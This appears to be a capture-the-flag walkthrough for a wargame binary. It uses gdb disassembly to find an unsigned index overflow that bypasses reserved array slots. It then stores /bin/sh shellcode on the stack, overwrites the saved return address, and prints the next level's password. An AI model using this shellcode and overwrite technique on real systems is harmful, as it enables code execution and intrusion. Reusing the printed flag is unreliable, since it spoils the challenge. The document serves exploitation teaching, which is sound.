# If we disass the main function we can see that at the start of the program every argv and env is set to 0
# This prevent us to inject a shellcode in argv or in the env

# The program manipulate an array on the stack as passed it's adress in the functions `read_number` and `store_number`
gdb> disass main
[...]
   0x08048924 <+513>:	lea    eax,[esp+0x24]
   0x08048928 <+517>:	mov    DWORD PTR [esp],eax
   0x0804892b <+520>:	call   0x80486d7 <read_number>    ; ret = read_number()
[...]
gdb> disass read_number
[...]
   0x080486fc <+37>:	shl    eax,0x2                    ; idx << 0x2 (idx * 4)
   0x080486ff <+40>:	add    eax,DWORD PTR [ebp+0x8]    ; idx * 4 + array
[...]
gdb> disass store_number
[...]
   0x08048686 <+86>:	test   edx,edx                      ; idx % 3 == 0
   0x08048688 <+88>:	je     0x8048697 <store_number+103>
   0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]     ; value
   0x0804868d <+93>:	shr    eax,0x18
   0x08048690 <+96>:	cmp    eax,0xb7                     ; value >> 0x18 == 0xb7
   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
   0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6    ; " *** ERROR! ***"
   0x0804869e <+110>:	call   0x80484c0 <puts@plt>         ; puts(" *** ERROR! ***")
   0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8    ; "   This index is reserved for wil!"
   0x080486aa <+122>:	call   0x80484c0 <puts@plt>         ; puts("   This index is reserved for wil!")
   0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6    ; " *** ERROR! ***"
   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>         ; puts(" *** ERROR! ***")
[...]
   0x080486c5 <+149>:	shl    eax,0x2                      ; idx << 0x2 (idx * 4)
   0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]      ; idx * 4 + array
   0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080486ce <+158>:	mov    DWORD PTR [eax],edx
[...]
# Here we can see that every 3 index is reserved
# The array is indexed using pointer arithmetic so we can bypass the check using unsigned overflow

# We will try to store a shellcode in the array then overwrite the `eip` to jump at the address of the array

# First let's find the address of the array on the stack
# Because gdb alter the address of the array we want to jump in we need to find a way to find it's address during runtime
gdb> b read_number
gdb> r
[...]
Input command: read
# The array is load by the instruction `DWORD PTR [ebp+0x8]`
gdb> x $ebp+0x8
0xffffd5b0:	0xffffd5d4
gdB> p/d (0xffffd5d4 - 0xffffd5b0) / 4
$1 = 9
# We need to read the index -9 to find the address of the array at runtime

# Now we need to find where the eip is saved on the stack so we can overwrite it
gdb> disass main
[...]
   0x0804892b <+520>:	call   0x80486d7 <read_number>    ; ret = read_number()
[...]
gdb> b *0x0804892b
gdb> r
[...]
Input command: read
gdb> info frame
[...]
 Saved registers:
  ebx at 0xffffd78c, ebp at 0xffffd798, esi at 0xffffd790, edi at 0xffffd794, eip at 0xffffd79c
[...]
gdb> p/d (0xffffd79c - 0xffffd5d4) / 4
$1 = 114
# 114 % 3 == 0: It's a protected index


# We will use the following shellcode \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
# We convert each 4 bytes to an integer
$> python3
>>> 0xe1f7c931
3791112497
>>> 0x2f2f6851
791636049
>>> 0x2f686873
795371635
>>> 0x896e6962
2305714530
>>> 0xcd0bb0e3
3440095459
>>> 0x80
128

# Then we will use the fact that 2**32 overflow to 0 and ((2**32) / 4) % 3 == 1 to write at forbidden indexes
>>> (2**32) / 4 + 0
1073741824.0
>>> (2**32) / 4 + 3
1073741827.0
>>> (2**32) / 4 + 114
1073741938.0
# We have everything we need

# First we will store our shellcode in the index 0-5
# Then we find the address of our array at index -9
# Then we store the adddress of the array at the address of eip at index 114
$> ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 3791112497
 Index: 1073741824
 Completed store command successfully

Input command: store
 Number: 791636049
 Index: 1
 Completed store command successfully

Input command: store
 Number: 795371635
 Index: 2
 Completed store command successfully

Input command: store
 Number: 2305714530
 Index: 1073741827
 Completed store command successfully

Input command: store
 Number: 3440095459
 Index: 4
 Completed store command successfully

Input command: store
 Number: 128
 Index: 5
 Completed store command successfully

Input command: read
 Index: -9
 Number at data[4294967287] is 4294956340
 Completed read command successfully

Input command: store
 Number: 4294956340 // (114) - подмена eip у функции main ; 2147483638 (-10) - подмена eip у функции store_number
 Index: 1073741938
 Completed store command successfully

Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC


